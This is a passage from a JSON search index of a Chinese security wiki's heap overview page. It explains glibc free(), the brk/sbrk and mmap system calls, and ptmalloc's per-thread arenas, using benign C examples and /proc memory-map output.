            "text": "\u5728 glibc \u7684  malloc.h  \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b  /*        free(void* p)        Releases the chunk of memory pointed to by p, that had been previously        allocated using malloc or a related routine such as realloc.        It has no effect if p is null. It can have arbitrary (i.e., bad!)        effects if p has already been freed.        Unless disabled (using mallopt), freeing very large spaces will        when possible, automatically trigger operations that give        back unused memory to the system, thus reducing program footprint.      */   \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002  \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406   \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002  \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f  double free \u3002  \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002", 
            "title": "free"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_4", 
            "text": "\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f  (s)brk  \u51fd\u6570\u4ee5\u53ca  mmap, munmap  \u51fd\u6570\u3002  \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002", 
            "title": "\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#sbrk", 
            "text": "\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0  brk  (program break location, the program break is the address of the first location beyond the current end of the data region,  https://en.wikipedia.org/wiki/Sbrk)\u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58 \u3002  \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740  start_brk  \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e  brk  \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542fASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c   \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002  \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002   \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a   \u4f8b\u5b50  /* sbrk and brk example */  ##include  stdio.h  ##include  unistd.h  ##include  sys/types.h  int   main ()  { \n         void   * curr_brk ,   * tmp_brk   =   NULL ; \n\n         printf ( Welcome to sbrk example:%d \\n ,   getpid ()); \n\n         /* sbrk(0) gives current program break location */ \n         tmp_brk   =   curr_brk   =   sbrk ( 0 ); \n         printf ( Program Break Location1:%p \\n ,   curr_brk ); \n         getchar (); \n\n         /* brk(addr) increments/decrements program break location */ \n         brk ( curr_brk + 4096 ); \n\n         curr_brk   =   sbrk ( 0 ); \n         printf ( Program break Location2:%p \\n ,   curr_brk ); \n         getchar (); \n\n         brk ( tmp_brk ); \n\n         curr_brk   =   sbrk ( 0 ); \n         printf ( Program Break Location3:%p \\n ,   curr_brk ); \n         getchar (); \n\n         return   0 ;  }   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86getchar()\u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002  \u5728\u7b2c\u4e00\u6b21\u8c03\u7528brk\u4e4b\u524d  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64   start_brk = brk = end_data = 0x804b000   sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p  00001000   08 :01  539624      /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  \u7b2c\u4e00\u6b21\u589e\u52a0brk\u540e  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5   start_brk = end_data = 0x804b000  brk = 0x804c000   sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\nProgram Break Location2:0x804c000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p  00001000   08 :01  539624      /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\n0804b000-0804c000 rw-p  00000000   00 :00  0            [ heap ] \nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c   0x0804b000 \u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740  rw-p\u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002  00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002  00:00 \u662f\u4e3b\u4ece(Major/mirror)\u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a0\u3002  0\u8868\u793a\u7740Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002", 
            "title": "(s)brk"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#mmap", 
            "text": "malloc \u4f1a\u4f7f\u7528  mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee50\u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002  \u4f8b\u5b50  /* Private anonymous mapping example using mmap syscall */  ##include  stdio.h  ##include  sys/mman.h  ##include  sys/types.h  ##include  sys/stat.h  ##include  fcntl.h  ##include  unistd.h  ##include  stdlib.h  void   static   inline   errExit ( const   char *   msg )  { \n         printf ( %s failed. Exiting the process \\n ,   msg ); \n         exit ( - 1 );  }  int   main ()  { \n         int   ret   =   - 1 ; \n         printf ( Welcome to private anonymous mapping example::PID:%d \\n ,   getpid ()); \n         printf ( Before mmap \\n ); \n         getchar (); \n         char *   addr   =   NULL ; \n         addr   =   mmap ( NULL ,   ( size_t ) 132 * 1024 ,   PROT_READ | PROT_WRITE ,   MAP_PRIVATE   |   MAP_ANONYMOUS ,   - 1 ,   0 ); \n         if   ( addr   ==   MAP_FAILED ) \n                 errExit ( mmap ); \n         printf ( After mmap \\n ); \n         getchar (); \n\n         /* Unmap mapped region. */ \n         ret   =   munmap ( addr ,   ( size_t ) 132 * 1024 ); \n         if ( ret   ==   - 1 ) \n                 errExit ( munmap ); \n         printf ( After munmap \\n ); \n         getchar (); \n         return   0 ;  }   \u5728\u6267\u884cmmap\u4e4b\u524d  \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709.so\u6587\u4ef6\u7684mmap\u6bb5\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p  00001000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  mmap\u540e  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86b7e00000\u5230b7e21000\u7684mmap\u6bb5\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p  00001000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e00000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$  munmap  \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p  00000000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p  00001000   08 :01  539691      /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$", 
            "title": "mmap"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_5", 
            "text": "\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728glibc\u7684ptmalloc\u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002  \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002  /* Per thread arena example. */  ##include  stdio.h  ##include  stdlib.h  ##include  pthread.h  ##include  unistd.h  ##include  sys/types.h  void *   threadFunc ( void *   arg )   { \n         printf ( Before malloc in thread 1 \\n ); \n         getchar (); \n         char *   addr   =   ( char * )   malloc ( 1000 ); \n         printf ( After malloc and before free in thread 1 \\n ); \n         getchar (); \n         free ( addr ); \n         printf ( After free in thread 1 \\n ); \n         getchar ();  }  int   main ()   { \n         pthread_t   t1 ; \n         void *   s ; \n         int   ret ; \n         char *   addr ; \n\n         printf ( Welcome to per thread arena example::%d \\n , getpid ()); \n         printf ( Before malloc in main thread \\n ); \n         getchar (); \n         addr   =   ( char * )   malloc ( 1000 ); \n         printf ( After malloc and before free in main thread \\n ); \n         getchar (); \n         free ( addr ); \n         printf ( After free in main thread \\n ); \n         getchar (); \n         ret   =   pthread_create ( t1 ,   NULL ,   threadFunc ,   NULL ); \n         if ( ret ) \n         { \n                 printf ( Thread creation error \\n ); \n                 return   - 1 ; \n         } \n         ret   =   pthread_join ( t1 ,   s ); \n         if ( ret ) \n         { \n                 printf ( Thread join error \\n ); \n                 return   - 1 ; \n         } \n         return   0 ;  }   \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\nb7e05000-b7e07000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660emalloc\u7684\u80cc\u540e\u662f\u7528brk\u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e861000\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e860x0806c000-0x0804b000=0x21000\u4e2a\u5b57\u8282\u7684\u5806\u3002 \u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002 \u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0brk\u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7e05000-b7e07000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531glibc\u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\n...\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7e05000-b7e07000 rw-p  00000000   00 :00  0  \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u6808\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread  1 \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7604000-b7605000 ---p  00000000   00 :00  0  \nb7605000-b7e07000 rw-p  00000000   00 :00  0            [ stack:6594 ] \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b1\u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3ammap\u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709132KB\u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3athread arena\u3002  \u6ce8\u610f\uff1a   \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e128KB\u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55arena\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884cmmap\u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002   sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread  1 \nAfter malloc and before free in thread  1 \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7500000-b7521000 rw-p  00000000   00 :00  0  \nb7521000-b7600000 ---p  00000000   00 :00  0  \nb7604000-b7605000 ---p  00000000   00 :00  0  \nb7605000-b7e07000 rw-p  00000000   00 :00  0            [ stack:6594 ] \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$  \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002  sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread \nWelcome to per thread arena example::6501\nBefore malloc in main thread\nAfter malloc and before free in main thread\nAfter free in main thread\nBefore malloc in thread  1 \nAfter malloc and before free in thread  1 \nAfter free in thread  1 \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p  00000000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804a000-0804b000 rw-p  00001000   08 :01  539625      /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p  00000000   00 :00  0            [ heap ] \nb7500000-b7521000 rw-p  00000000   00 :00  0  \nb7521000-b7600000 ---p  00000000   00 :00  0  \nb7604000-b7605000 ---p  00000000   00 :00  0  \nb7605000-b7e07000 rw-p  00000000   00 :00  0            [ stack:6594 ] \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$", 
            "title": "\u591a\u7ebf\u7a0b\u652f\u6301"
        }, 
        {
            "location": "/pwn/heap/heap_overview/#_6", 
            "text": "sploitfun", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/heap_structure/", 
